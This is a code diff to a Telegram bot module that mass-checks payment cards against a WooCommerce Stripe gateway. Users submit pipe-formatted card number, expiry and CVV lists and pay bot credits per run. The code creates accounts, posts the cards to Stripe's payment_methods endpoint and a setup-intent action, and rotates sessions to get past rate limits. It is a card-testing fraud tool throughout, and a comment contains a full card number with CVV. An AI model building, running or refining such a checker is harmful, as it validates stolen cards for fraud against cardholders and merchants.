@@ -1,5 +1,6 @@
 # BOT/gates/auth/mass/massau.py
-# Mass Stripe Auth checker with automatic session renewal on rate limits
+# Mass Stripe Auth checker with OPTIMIZED session reuse (ONE session for ALL cards)
+# AND 3 credits deduction for the entire mass check
 
 import asyncio
 import json
@@ -25,10 +26,8 @@ class MassStripeAuthChecker:
         self.checker = StripeAuthChecker()
         self.current_client = None
         self.current_nonce = None
-        self.session_card_count = 0
-        self.max_cards_per_session = 2  # Conservative: max 2 cards per session before potential rate limit
         self.retry_count = 0
-        self.max_retries = 2  # Maximum retries per card
+        self.max_retries = 2  # Maximum retries per card when rate limited
         
     async def create_fresh_session(self):
         """Create a brand new session with new account"""
@@ -49,7 +48,6 @@ class MassStripeAuthChecker:
             if nonce:
                 self.current_client = client
                 self.current_nonce = nonce
-                self.session_card_count = 0
                 self.retry_count = 0
                 logger.success("✅ New session created successfully")
                 return True
@@ -83,87 +81,8 @@ class MassStripeAuthChecker:
                 return True
         return False
     
-    async def check_card_with_session_management(self, card_details, username, user_data):
-        """Check card with automatic session renewal on rate limits"""
-        
-        # If no session exists, create one
-        if not self.current_client or not self.current_nonce:
-            session_created = await self.create_fresh_session()
-            if not session_created:
-                # Return error if can't create session
-                return await self.checker.format_response(
-                    *self.parse_card_details(card_details), 
-                    "ERROR", 
-                    "Failed to create session", 
-                    username, 
-                    0, 
-                    user_data
-                )
-        
-        # Check if we've reached max cards per session
-        if self.session_card_count >= self.max_cards_per_session:
-            logger.info(f"⚠️ Reached {self.max_cards_per_session} cards per session, creating new session...")
-            session_created = await self.create_fresh_session()
-            if not session_created:
-                return await self.checker.format_response(
-                    *self.parse_card_details(card_details), 
-                    "ERROR", 
-                    "Failed to create new session", 
-                    username, 
-                    0, 
-                    user_data
-                )
-        
-        try:
-            # Check card with existing session
-            result = await self.check_card_with_existing_session(card_details, username, user_data)
-            
-            # If successful, increment session card count
-            self.session_card_count += 1
-            self.retry_count = 0  # Reset retry count on success
-            return result
-            
-        except Exception as e:
-            error_str = str(e)
-            logger.warning(f"⚠️ Card check failed: {error_str}")
-            
-            # Check if it's a rate limit error
-            if self.is_rate_limit_error(error_str) and self.retry_count < self.max_retries:
-                self.retry_count += 1
-                logger.info(f"🔄 Rate limit detected, retry {self.retry_count}/{self.max_retries} with new session...")
-                
-                # Create new session
-                session_created = await self.create_fresh_session()
-                if session_created:
-                    # Retry the card with new session
-                    return await self.check_card_with_session_management(card_details, username, user_data)
-                else:
-                    return await self.checker.format_response(
-                        *self.parse_card_details(card_details), 
-                        "ERROR", 
-                        f"Rate limit - failed to create new session", 
-                        username, 
-                        0, 
-                        user_data
-                    )
-            else:
-                # Not a rate limit error or max retries exceeded
-                self.retry_count = 0
-                # Parse card details for error response
-                cc, mes, ano, cvv = self.parse_card_details(card_details)
-                bin_info = await self.checker.get_bin_info(cc)
-                return await self.checker.format_response(
-                    cc, mes, ano, cvv, 
-                    "ERROR", 
-                    error_str[:80], 
-                    username, 
-                    0, 
-                    user_data,
-                    bin_info
-                )
-    
-    async def check_card_with_existing_session(self, card_details, username, user_data):
-        """Check card using existing session (adapted from stauth.py)"""
+    async def check_card_with_session(self, card_details, username, user_data, client=None, nonce=None, retry_count=0):
+        """OPTIMIZED: Check card using existing session (for mass checking) with rate limit handling"""
         start_time = time.time()
         
         # Parse card details
@@ -219,7 +138,7 @@ class MassStripeAuthChecker:
                 'sec-ch-ua-platform': self.checker.sec_ch_ua_platform
             }
             
-            stripe_response = await self.current_client.post(
+            stripe_response = await client.post(
                 "https://api.stripe.com/v1/payment_methods", 
                 headers=stripe_headers, 
                 data=stripe_data
@@ -264,10 +183,10 @@ class MassStripeAuthChecker:
                 'action': 'wc_stripe_create_and_confirm_setup_intent',
                 'wc-stripe-payment-method': payment_method_id,
                 'wc-stripe-payment-type': 'card',
-                '_ajax_nonce': self.current_nonce
+                '_ajax_nonce': nonce
             }
             
-            ajax_response = await self.current_client.post(ajax_url, headers=ajax_headers, data=ajax_data)
+            ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
             
             if ajax_response.status_code != 200:
                 return await self.checker.format_response(
@@ -308,9 +227,28 @@ class MassStripeAuthChecker:
                 elif isinstance(error_data, str):
                     error_message = error_data
                 
-                # Raise exception for rate limit detection
-                if self.is_rate_limit_error(error_message):
-                    raise Exception(error_message)
+                # Check for rate limit error - retry with new session if needed
+                if self.is_rate_limit_error(error_message) and retry_count < self.max_retries:
+                    logger.info(f"🔄 Rate limit detected, retrying with new session (attempt {retry_count + 1})")
+                    
+                    # Create new session for this card only
+                    new_client, new_nonce, session_msg = await self.checker.create_authenticated_session()
+                    if new_nonce:
+                        # Retry this card with new session
+                        result = await self.check_card_with_session(
+                            card_details, username, user_data, new_client, new_nonce, retry_count + 1
+                        )
+                        # Close the new session after use
+                        try:
+                            await new_client.aclose()
+                        except:
+                            pass
+                        return result
+                    else:
+                        return await self.checker.format_response(
+                            cc, mes, ano, cvv, "DECLINED", "Rate limit - failed to create new session", 
+                            username, time.time()-start_time, user_data, bin_info
+                        )
                 
                 return await self.checker.format_response(
                     cc, mes, ano, cvv, "DECLINED", error_message, 
@@ -318,7 +256,30 @@ class MassStripeAuthChecker:
                 )
                 
         except Exception as e:
-            raise e
+            # Check if it's a rate limit error in the exception
+            if self.is_rate_limit_error(str(e)) and retry_count < self.max_retries:
+                logger.info(f"🔄 Rate limit exception, retrying with new session (attempt {retry_count + 1})")
+                
+                # Create new session for this card only
+                new_client, new_nonce, session_msg = await self.checker.create_authenticated_session()
+                if new_nonce:
+                    # Retry this card with new session
+                    result = await self.check_card_with_session(
+                        card_details, username, user_data, new_client, new_nonce, retry_count + 1
+                    )
+                    # Close the new session after use
+                    try:
+                        await new_client.aclose()
+                    except:
+                        pass
+                    return result
+            
+            # Not a rate limit error or max retries exceeded
+            bin_info = await self.checker.get_bin_info(cc)
+            return await self.checker.format_response(
+                cc, mes, ano, cvv, "ERROR", str(e)[:80], 
+                username, time.time()-start_time, user_data, bin_info
+            )
     
     def parse_card_details(self, card_details):
         """Parse card details from string"""
@@ -345,7 +306,7 @@ class MassStripeAuthChecker:
             return "", "", "", ""
     
     async def format_mass_response(self, results, successful, failed, total_cards, username, elapsed_time, user_data):
-        """Format the mass check results with proper UI - FIXED to use /mau in header"""
+        """Format the mass check results with ALL cards shown (no truncation)"""
         user_id = user_data.get("user_id", "Unknown")
         first_name = html.escape(user_data.get("first_name", "User"))
         badge = user_data.get("plan", {}).get("badge", "🎭")
@@ -360,15 +321,13 @@ class MassStripeAuthChecker:
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Results:</b> ✅ {successful} | ❌ {failed}
 <b>[+] Total Cards:</b> <code>{total_cards}</code>
+<b>[+] Credits Used:</b> <code>3</code> (for entire mass check)
 ━━━━━━━━━━━━━━━
 """
         
-        # Add each card result (limit to first 10 to avoid message too long)
-        for i, result in enumerate(results[:10]):
+        # Add each card result (show ALL cards, no truncation)
+        for i, result in enumerate(results):
             response += f"<b>Card {i+1}:</b>\n{result}\n\n"
-        
-        if len(results) > 10:
-            response += f"<b>... and {len(results) - 10} more cards</b>\n\n"
         
         response += f"""━━━━━━━━━━━━━━━
 <b>[ﾒ] Checked By:</b> {user_display}
@@ -385,58 +344,77 @@ class MassStripeAuthChecker:
 <b>[•] Gateway -</b> Stripe Auth Mass
 <b>[•] Status-</b> Processing... ⏳
 <b>[•] Cards-</b> <code>{card_count}</code> cards in queue
+<b>[•] Credits-</b> <code>3</code> will be deducted for this mass check
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Plan:</b> {user_plan}
 <b>[+] User:</b> @{username}
 ━━━━━━━━━━━━━━━
 <b>Processing mass check... Please wait.</b>"""
 
-async def parse_card_list(message: Message):
-    """Parse card list from message or reply - FIXED to properly handle multi-line input"""
+def parse_card_list(message: Message):
+    """Parse card list from message or reply - COMPLETELY REWRITTEN for reliability"""
     card_list = []
     
-    # Case 1: User replied to a message containing cards
-    if message.reply_to_message:
-        replied_msg = message.reply_to_message
-        if replied_msg and replied_msg.text:
-            lines = replied_msg.text.strip().split('\n')
-            for line in lines:
-                line = line.strip()
-                if line and '|' in line:
-                    # Check if it's a valid card format (has 4 parts)
-                    parts = line.split('|')
-                    if len(parts) == 4:
-                        cc, mes, ano, cvv = [p.strip() for p in parts]
-                        # Basic validation
-                        if cc.replace(" ", "").isdigit() and len(cc.replace(" ", "")) >= 15:
-                            card_list.append(line)
+    # Get the full message text
+    full_text = message.text or ""
     
-    # Case 2: Cards in the same message after the command
-    else:
-        # Get the full message text
-        full_text = message.text
+    # Debug print
+    print(f"Full message text: {repr(full_text)}")
+    
+    # Split by lines
+    lines = full_text.split('\n')
+    print(f"Lines after split: {lines}")
+    
+    # Skip the first line if it contains the command
+    for i, line in enumerate(lines):
+        line = line.strip()
+        if not line:
+            continue
+            
+        # Check if this line contains the command
+        if i == 0 and any(line.startswith(prefix) for prefix in ['/mau', '.mau', '$mau']):
+            # This is the command line, extract content after command
+            # Split the command line by spaces and take everything after first part
+            parts = line.split()
+            if len(parts) > 1:
+                # There might be a card on the same line
+                potential_card = ' '.join(parts[1:]).strip()
+                if potential_card and '|' in potential_card:
+                    # Check if it's a valid card format
+                    card_parts = potential_card.split('|')
+                    if len(card_parts) == 4:
+                        card_list.append(potential_card)
+            continue
         
-        # Remove the command part - handle both with and without bot username
-        # Split by whitespace and take the first part as command
+        # Regular line - check if it contains a card
+        if '|' in line:
+            # Check if it's a valid card format (has 4 parts)
+            parts = line.split('|')
+            if len(parts) == 4:
+                cc, mes, ano, cvv = [p.strip() for p in parts]
+                # Basic validation
+                cc_clean = cc.replace(" ", "")
+                if cc_clean.isdigit() and len(cc_clean) >= 15:
+                    card_list.append(line)
+                    print(f"Found card: {line}")
+    
+    # If we found cards, return them
+    if card_list:
+        return card_list
+    
+    # Try alternative: maybe the entire message after command is one card
+    # This handles the case where user does: /mau 5414963811565512|09|28|822
+    if len(lines) == 1:
+        # Single line message
         parts = full_text.split()
-        command_part = parts[0]
-        
-        # The rest is the content
-        remaining_text = full_text[len(command_part):].strip()
-        
-        if remaining_text:
-            # Split by lines and process
-            lines = remaining_text.split('\n')
-            for line in lines:
-                line = line.strip()
-                if line and '|' in line:
-                    # Check if it's a valid card format (has 4 parts)
-                    parts = line.split('|')
-                    if len(parts) == 4:
-                        cc, mes, ano, cvv = [p.strip() for p in parts]
-                        # Basic validation
-                        if cc.replace(" ", "").isdigit() and len(cc.replace(" ", "")) >= 15:
-                            card_list.append(line)
+        if len(parts) >= 2:
+            # Command + something
+            potential_card = ' '.join(parts[1:]).strip()
+            if potential_card and '|' in potential_card:
+                card_parts = potential_card.split('|')
+                if len(card_parts) == 4:
+                    card_list.append(potential_card)
+                    print(f"Found single line card: {potential_card}")
     
     # Remove duplicates while preserving order
     seen = set()
@@ -446,6 +424,7 @@ async def parse_card_list(message: Message):
             seen.add(card)
             unique_cards.append(card)
     
+    print(f"Final card list: {unique_cards}")
     return unique_cards
 
 @Client.on_message(filters.command(["mau", ".mau", "$mau"]))
@@ -456,8 +435,8 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
         username = message.from_user.username or str(user_id)
         
         # Check if command is disabled
-        command_text = message.text.split()[0]
-        command_name = command_text.lstrip('/.$')
+        command_text = message.text.split()[0] if message.text else ""
+        command_name = command_text.lstrip('/.$') if command_text else "mau"
         
         if is_command_disabled(command_name):
             await message.reply(get_command_offline_message(command_text))
@@ -488,7 +467,9 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
         plan_name = user_plan.get("plan", "Free")
         
         # Parse card list
-        card_list = await parse_card_list(message)
+        card_list = parse_card_list(message)
+        
+        print(f"Parsed card list: {card_list}")
         
         if len(card_list) == 0:
             await message.reply("""<pre>❌ No Valid Cards Found</pre>
@@ -524,22 +505,22 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
 ━━━━━━━━━━━━━""")
             return
         
-        # Check if user has enough credits for mass check (2 credits)
-        has_credits, credit_msg = has_sufficient_credits(user_id, 2)
+        # IMPORTANT: Check if user has enough credits for mass check (3 credits for entire command)
+        has_credits, credit_msg = has_sufficient_credits(user_id, 3)
         
         if not has_credits:
             current_credits = get_user_credits(user_id)
             await message.reply(f"""<pre>❌ Insufficient Credits</pre>
 ━━━━━━━━━━━━━
 ⟐ <b>Message</b>: You don't have enough credits for mass check.
-⟐ <b>Required:</b> <code>2 credits</code>
+⟐ <b>Required:</b> <code>3 credits</code> (for entire mass check)
 ⟐ <b>Available:</b> <code>{current_credits}</code>
 ⟐ <b>Your Plan:</b> <code>{plan_name}</code>
 ━━━━━━━━━━━━━""")
             return
         
-        # Deduct credits BEFORE processing mass check
-        deduct_success, deduct_msg = deduct_credit(user_id, 2)
+        # IMPORTANT: Deduct 3 credits BEFORE processing mass check (ONCE for entire command)
+        deduct_success, deduct_msg = deduct_credit(user_id, 3)
         
         if not deduct_success:
             await message.reply(f"""<pre>❌ Credit Deduction Failed</pre>
@@ -562,7 +543,21 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
         successful = 0
         failed = 0
         
-        # Process each card with smart session management
+        # OPTIMIZATION: Create ONE shared session for ALL cards
+        print("🔄 Creating shared session for mass check...")
+        client, nonce, session_msg = await mass_checker.checker.create_authenticated_session()
+        
+        if not nonce:
+            await processing_msg.edit_text("""<pre>❌ Session Creation Failed</pre>
+━━━━━━━━━━━━━
+⟐ <b>Message</b>: Failed to create session for mass check.
+⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
+━━━━━━━━━━━━━""")
+            return
+        
+        print(f"✅ Shared session created successfully with nonce: {nonce}")
+        
+        # Process each card using the SAME shared session
         for i, card_details in enumerate(card_list):
             # Update progress every 2 cards or on last card
             if (i + 1) % 2 == 0 or i == len(card_list) - 1:
@@ -573,6 +568,7 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
 <b>[•] Gateway -</b> Stripe Auth Mass
 <b>[•] Status-</b> Processing... ⏳
 <b>[•] Progress-</b> <code>{i+1}/{card_count}</code> cards
+<b>[•] Credits Used-</b> <code>3</code> (deducted)
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 <b>[+] Plan:</b> {plan_name}
 <b>[+] User:</b> @{username}
@@ -582,12 +578,15 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
                 except:
                     pass
             
-            # Check card with automatic session renewal on rate limits
+            # Check card using the shared session (with rate limit handling)
             try:
-                result = await mass_checker.check_card_with_session_management(
+                result = await mass_checker.check_card_with_session(
                     card_details, 
                     username, 
-                    user_data
+                    user_data,
+                    client=client,
+                    nonce=nonce,
+                    retry_count=0
                 )
                 
                 results.append(result)
@@ -608,20 +607,21 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
                 results.append(error_result)
                 failed += 1
             
-            # Delay between cards to avoid rate limiting
+            # Delay between cards to avoid rate limiting (reduced from 3-5 to 2-4 seconds)
             if i < len(card_list) - 1:
-                await asyncio.sleep(random.uniform(3, 5))
+                await asyncio.sleep(random.uniform(2, 4))
         
-        # Close the final session
-        if mass_checker.current_client:
+        # Close the shared session after all cards are processed
+        if client:
             try:
-                await mass_checker.current_client.aclose()
+                await client.aclose()
+                print("✅ Shared session closed successfully")
             except:
-                pass
+                print("⚠️ Failed to close shared session")
         
         elapsed_time = time.time() - start_time
         
-        # Format final response
+        # Format final response (with ALL cards shown)
         final_response = await mass_checker.format_mass_response(
             results, successful, failed, card_count, username, elapsed_time, user_data
         )
@@ -633,6 +633,7 @@ async def handle_mass_stripe_auth(client: Client, message: Message):
         try:
             await processing_msg.edit_text(final_response, disable_web_page_preview=True)
         except Exception as e:
+            print(f"Failed to edit message: {e}")
             # If editing fails, send as new message
             try:
                 await message.reply(final_response, disable_web_page_preview=True)
